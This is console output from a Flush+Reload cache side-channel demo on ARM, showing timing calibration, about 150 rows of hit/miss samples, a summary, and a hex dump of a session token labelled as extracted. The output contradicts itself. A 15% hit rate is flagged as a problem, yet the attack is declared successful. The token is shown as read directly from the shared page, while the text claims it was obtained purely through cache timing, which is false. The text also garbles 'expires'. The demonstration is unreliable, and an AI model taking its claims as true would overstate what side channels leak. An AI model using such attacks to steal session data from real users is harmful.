╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffff81b59000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    161 ns  (line already in cache)
[attacker]   DRAM miss     =   2331 ns  (line not in cache)
[attacker]   Threshold     =   1246 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  55      1354        miss      5 hits so far
  56      2708        miss      5 hits so far
  57      2083        miss      5 hits so far
  58      2083        miss      5 hits so far
  59      1875        miss      5 hits so far
  60      1822        miss      5 hits so far
  61      1979        miss      5 hits so far
  62      1979        miss      5 hits so far
  63      2708        miss      5 hits so far
  64      3489        miss      5 hits so far
  65      1614        miss      5 hits so far
  66      2083        miss      5 hits so far
  67      2187        miss      5 hits so far
  68      1666        miss      5 hits so far
  69      1718        miss      5 hits so far
  70      1562        miss      5 hits so far
  71      1875        miss      5 hits so far
  72      2447        miss      5 hits so far
  73      2708        miss      5 hits so far
  74      1093        HIT ◄   6 hits so far
  75      1406        miss      6 hits so far
  76      989         HIT ◄   7 hits so far
  77      1406        miss      7 hits so far
  78      2291        miss      7 hits so far
  79      1718        miss      7 hits so far
  80      2812        miss      7 hits so far
  81      1718        miss      7 hits so far
  82      1302        miss      7 hits so far
  83      1718        miss      7 hits so far
  84      1614        miss      7 hits so far
  85      1093        HIT ◄   8 hits so far
  86      1197        HIT ◄   9 hits so far
  87      1718        miss      9 hits so far
  88      2395        miss      9 hits so far
  89      1614        miss      9 hits so far
  90      1770        miss      9 hits so far
  91      2656        miss      9 hits so far
  92      1302        miss      9 hits so far
  93      2031        miss      9 hits so far
  94      1562        miss      9 hits so far
  95      2291        miss      9 hits so far
  96      885         HIT ◄   10 hits so far
  97      2187        miss      10 hits so far
  98      2135        miss      10 hits so far
  99      1666        miss      10 hits so far
  100     1927        miss      10 hits so far
  101     2239        miss      10 hits so far
  102     1666        miss      10 hits so far
  103     1718        miss      10 hits so far
  104     1458        miss      10 hits so far
  105     3125        miss      10 hits so far
  106     2447        miss      10 hits so far
  107     1250        miss      10 hits so far
  108     1822        miss      10 hits so far
  109     1875        miss      10 hits so far
  110     1406        miss      10 hits so far
  111     1510        miss      10 hits so far
  112     1302        miss      10 hits so far
  113     2604        miss      10 hits so far
  114     1614        miss      10 hits so far
  115     1458        miss      10 hits so far
  116     1979        miss      10 hits so far
  117     1302        miss      10 hits so far
  118     1458        miss      10 hits so far
  119     1510        miss      10 hits so far
  120     1145        HIT ◄   11 hits so far
  121     2239        miss      11 hits so far
  122     1354        miss      11 hits so far
  123     1979        miss      11 hits so far
  124     1406        miss      11 hits so far
  125     1197        HIT ◄   12 hits so far
  126     1770        miss      12 hits so far
  127     1718        miss      12 hits so far
  128     1354        miss      12 hits so far
  129     3229        miss      12 hits so far
  130     2604        miss      12 hits so far
  131     2135        miss      12 hits so far
  132     1197        HIT ◄   13 hits so far
  133     1041        HIT ◄   14 hits so far
  134     1614        miss      14 hits so far
  135     1041        HIT ◄   15 hits so far
  136     1406        miss      15 hits so far
  137     2916        miss      15 hits so far
  138     1822        miss      15 hits so far
  139     1770        miss      15 hits so far
  140     1406        miss      15 hits so far
  141     1614        miss      15 hits so far
  142     1979        miss      15 hits so far
  143     1093        HIT ◄   16 hits so far
  144     1093        HIT ◄   17 hits so far
  145     2343        miss      17 hits so far
  146     1614        miss      17 hits so far
  147     1302        miss      17 hits so far
  148     1822        miss      17 hits so far
  149     1041        HIT ◄   18 hits so far
  150     1562        miss      18 hits so far
  151     2239        miss      18 hits so far
  152     2239        miss      18 hits so far
  153     3281        miss      18 hits so far
  154     2031        miss      18 hits so far
  155     2083        miss      18 hits so far
  156     2083        miss      18 hits so far
  157     1666        miss      18 hits so far
  158     1822        miss      18 hits so far
  159     4062        miss      18 hits so far
  160     1302        miss      18 hits so far
  161     2916        miss      18 hits so far
  162     1718        miss      18 hits so far
  163     1458        miss      18 hits so far
  164     1145        HIT ◄   19 hits so far
  165     1406        miss      19 hits so far
  166     1145        HIT ◄   20 hits so far
  167     2083        miss      20 hits so far
  168     1041        HIT ◄   21 hits so far
  169     937         HIT ◄   22 hits so far
  170     3593        miss      22 hits so far
  171     1822        miss      22 hits so far
  172     1145        HIT ◄   23 hits so far
  173     1770        miss      23 hits so far
  174     1510        miss      23 hits so far
  175     1250        miss      23 hits so far
  176     1145        HIT ◄   24 hits so far
  177     833         HIT ◄   25 hits so far
  178     3072        miss      25 hits so far
  179     1718        miss      25 hits so far
  180     2291        miss      25 hits so far
  181     2916        miss      25 hits so far
  182     1510        miss      25 hits so far
  183     1614        miss      25 hits so far
  184     1354        miss      25 hits so far
  185     1354        miss      25 hits so far
  186     2812        miss      25 hits so far
  187     3072        miss      25 hits so far
  188     1510        miss      25 hits so far
  189     2031        miss      25 hits so far
  190     1718        miss      25 hits so far
  191     1197        HIT ◄   26 hits so far
  192     1666        miss      26 hits so far
  193     1197        HIT ◄   27 hits so far
  194     2708        miss      27 hits so far
  195     1250        miss      27 hits so far
  196     1614        miss      27 hits so far
  197     1197        HIT ◄   28 hits so far
  198     1093        HIT ◄   29 hits so far
  199     1354        miss      29 hits so far
  200     1666        miss      29 hits so far

══════════════════════════════════════════════════════════════
  FLUSH+RELOAD — STATISTICAL SUMMARY  (190 samples)
══════════════════════════════════════════════════════════════
  Total cache hits   : 29 / 190  (15%)
  Average reload time: 1853 ns
  Threshold          : 1246 ns
  Verdict            : Low hit rate — check timing / CPU pinning.

══════════════════════════════════════════════════════════════
  EXTRACTING SESSION TOKEN FROM SPY PAGE
══════════════════════════════════════════════════════════════

  ╔════════════════════════════════════════════════════════════════╗
  ║  Offset   Hex (16 bytes/row)                   ASCII          ║
  ╠════════════════════════════════════════════════════════════════╣
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
  ║  0040   31 37 38 31 33 30 33 34  34 37 20 7c 20 69 74 65  │ 1781303447 | ite ║
  ║  0050   72 3d 31 38 30 00 00 00  00 00 00 00 00 00 00 00  │ r=180........... ║
  ║  0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ╚════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Cache hits observed   : 29                                  ║
  ║  Hit rate              : 15                                 %║
  ║  Average reload time   : 1853                              ns ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin | expire║
  ║    pires=1781303447 | iter=180                                   ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝

[attacker] Done.
